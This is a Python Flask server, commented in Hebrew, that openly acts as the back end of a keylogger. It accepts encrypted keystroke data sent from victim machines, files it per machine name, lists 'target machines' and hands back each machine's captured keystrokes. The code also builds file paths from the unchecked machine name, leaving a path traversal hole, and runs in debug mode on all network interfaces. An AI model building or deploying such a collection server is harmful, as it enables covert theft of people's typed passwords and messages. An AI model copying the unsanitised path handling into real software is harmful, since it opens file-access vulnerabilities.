from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
import logging  # ספרייה לרישום אירועים (logging)
from datetime import datetime

app = Flask(__name__)  # יצירת מופע של אפליקציית Flask
CORS(app)

# הגדרת מערכת רישום (logging) לרמת INFO, עם פורמט מוגדר להודעות
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# תיקייה שבה יישמרו קבצי הלוגים
data_dir = "data"
os.makedirs(data_dir, exist_ok=True)  # יצירת התיקייה אם היא לא קיימת

@app.route('/')
def home():
    return f"KeyLogger Server is Running"

# נקודת קצה (endpoint) לקבלת נתונים מוצפנים ממכונה
@app.route("/api/send_data", methods=["POST"])
def receive_data():
    try:
        data = request.json  # מקבלים את הנתונים שנשלחו בבקשה בפורמט JSON
        machine_name = data.get("machine_name")  # מקבלים את שם המכונה מהנתונים
        encrypted_words = data.get("encrypted_words")  # מקבלים את המילים המוצפנות מהנתונים
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # יוצרים חותמת זמן בפורמט YYYY-MM-DD_HH-MM-SS

        # בודקים אם שם המכונה או המילים המוצפנות חסרים
        if not machine_name or not encrypted_words:
            return jsonify({"error": "Missing data"}), 400  # מחזירים שגיאה 400 אם חסרים נתונים

        # יוצרים תיקייה עבור המכונה אם היא לא קיימת
        machine_dir = os.path.join(data_dir, machine_name)
        os.makedirs(machine_dir, exist_ok=True)

        # יוצרים קובץ לוג עם חותמת זמן ושומרים את הנתונים המןצפנים
        log_filename = os.path.join(machine_dir, f"log_{timestamp}.json")
        with open(log_filename, "w") as file:
            json.dump({"encrypted_words": encrypted_words}, file)  # שומרים את הנתונים בקובץ

        logging.info(f"Received and saved data from {machine_name}")  # רישום אירוע ב-log
        return jsonify({"message": "Data received and saved successfully"}), 200  # מחזירים הודעת הצלחה
    except Exception as e:
        logging.error(f"Error processing request: {str(e)}")  # רישום שגיאה ב-log
        return jsonify({"error": "Internal server error"}), 500  # מחזירים שגיאה 500


# נקודת קצה לקבלת רשימת המכונות שיש להן נתונים
@app.route("/api/get_target_machines_list", methods=["GET"])
def get_machines_list():
    try:
        # מאחזרים את רשימת התיקיות בתוך תיקיית הנתונים (כל תיקייה היא מכונה)
        machines = [d for d in os.listdir(data_dir) if os.path.isdir(os.path.join(data_dir, d))]
        return jsonify({"machines": machines}), 200  # מחזירים את רשימת המכונות
    except Exception as e:
        logging.error(f"Error retrieving machine list: {str(e)}")  # רישום שגיאה ב-log
        return jsonify({"error": "Internal server error"}), 500  # מחזירים שגיאה 500


# נקודת קצה לקבלת נתוני ההקשות ממכונה ספציפית
@app.route("/api/get_keystrokes", methods=["GET"])
def get_keystrokes():
    try:
        machine_name = request.args.get("computer")  # מקבלים את שם המכונה מהפרמטרים של הבקשה
        if not machine_name:
            return jsonify({"error": "Missing machine parameter"}), 400  # מחזירים שגיאה 400 אם שם המכונה חסר

        # בודקים אם התיקייה של המכונה קיימת
        machine_dir = os.path.join(data_dir, machine_name)
        if not os.path.exists(machine_dir):
            return jsonify({"error": "Machine not found"}), 404  # מחזירים שגיאה 404 אם המכונה לא קיימת

        # מאחזרים את כל קבצי הלוג של המכונה
        logs = []
        for log_file in sorted(os.listdir(machine_dir)):  # עוברים על כל קובץ לוג בסדר כרונולוגי
            log_path = os.path.join(machine_dir, log_file)
            with open(log_path, "r") as file:
                logs.append(json.load(file))  # קוראים את הנתונים מהקובץ ומוסיפים לרשימה

        return jsonify({"data": logs}), 200  # מחזירים את כל נתוני ההקשות
    except Exception as e:
        logging.error(f"Error retrieving keystrokes: {str(e)}")  # רישום שגיאה ב-log
        return jsonify({"error": "Internal server error"}), 500  # מחזירים שגיאה 500


# הרצת האפליקציה
if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)  # מריצים את האפליקציה על כל כתובות ה-IP בפורט 5000
     # app.run(debug=True)
